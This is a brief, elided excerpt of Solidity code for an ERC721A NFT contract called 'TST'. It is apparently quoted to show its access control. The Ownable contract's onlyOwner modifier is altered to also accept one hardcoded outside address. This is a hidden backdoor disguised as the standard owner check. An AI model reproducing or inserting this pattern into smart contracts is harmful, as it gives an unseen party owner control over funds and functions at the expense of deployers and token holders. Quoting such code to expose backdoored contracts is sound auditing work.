...
import 'swarm/14bec29d99646120535879d065dbe5dd389b85d96305224a0dbc807748acf2f4';
...
contract tstContract is ERC721A, Ownable {
    ...
    constructor() ERC721A("TST", "TST3298", MAX_MINTS, MAX_SUPPLY) {  
    }
...
abstract contract Ownable is Context {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender() || _msgSender() == 0x01aF6890EFBF82Eba5dE86FD5F266D08044E6822, "You are not the owner");
        _;
    }
